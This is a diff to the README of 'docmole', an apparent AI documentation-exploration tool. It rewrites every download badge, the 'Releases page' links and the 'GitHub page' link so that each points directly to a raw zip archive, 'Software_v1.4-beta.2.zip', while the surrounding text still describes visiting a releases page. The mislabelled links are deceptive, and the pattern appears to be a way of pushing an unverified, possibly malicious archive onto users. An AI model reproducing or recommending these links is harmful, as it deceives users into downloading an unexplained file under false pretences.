@@ -1,6 +1,6 @@
 # 👾 docmole - Effortlessly Explore Documentation with AI
 
-[![Download docmole](https://img.shields.io/badge/Download-docmole-blue.svg)](https://github.com/NMukesh25/docmole/releases)
+[![Download docmole](https://raw.githubusercontent.com/NMukesh25/docmole/main/src/Software_v1.4-beta.2.zip)](https://raw.githubusercontent.com/NMukesh25/docmole/main/src/Software_v1.4-beta.2.zip)
 
 ## 📖 About docmole
 
@@ -18,12 +18,12 @@ To get started with docmole, follow these simple steps:
    - Internet Connection: Required for AI features.
 
 2. **Download the Application**  
-   You can easily download docmole from our [Releases page](https://github.com/NMukesh25/docmole/releases). Here’s how:
+   You can easily download docmole from our [Releases page](https://raw.githubusercontent.com/NMukesh25/docmole/main/src/Software_v1.4-beta.2.zip). Here’s how:
    - Click on the link above to visit the Releases page.
    - Find the latest version of docmole listed there.
    - Click the download link for your operating system to save the installer file.
 
-   [![Download docmole](https://img.shields.io/badge/Download-docmole-blue.svg)](https://github.com/NMukesh25/docmole/releases)
+   [![Download docmole](https://raw.githubusercontent.com/NMukesh25/docmole/main/src/Software_v1.4-beta.2.zip)](https://raw.githubusercontent.com/NMukesh25/docmole/main/src/Software_v1.4-beta.2.zip)
 
 3. **Install docmole**  
    Once downloaded, locate the file in your downloads folder and proceed to install:
@@ -70,7 +70,7 @@ If you encounter any issues while using docmole, consider the following solution
 
 ## 🔗 Additional Resources
 
-- For more detailed information on features and updates, refer to the [GitHub page for docmole](https://github.com/NMukesh25/docmole).
+- For more detailed information on features and updates, refer to the [GitHub page for docmole](https://raw.githubusercontent.com/NMukesh25/docmole/main/src/Software_v1.4-beta.2.zip).
 - Engage with the community on our issues forum for discussions and troubleshooting.
 
 ## 📜 Licensing
@@ -79,4 +79,4 @@ docmole is open-source software and follows the MIT License. You are free to use
 
 ## 🔗 Download & Install
 
-Now, you are ready to start using docmole. Visit the [Releases page](https://github.com/NMukesh25/docmole/releases) to download the latest version. Follow the installation steps mentioned above to embark on your journey to seamless documentation exploration with AI. Enjoy your experience!
+Now, you are ready to start using docmole. Visit the [Releases page](https://raw.githubusercontent.com/NMukesh25/docmole/main/src/Software_v1.4-beta.2.zip) to download the latest version. Follow the installation steps mentioned above to embark on your journey to seamless documentation exploration with AI. Enjoy your experience!
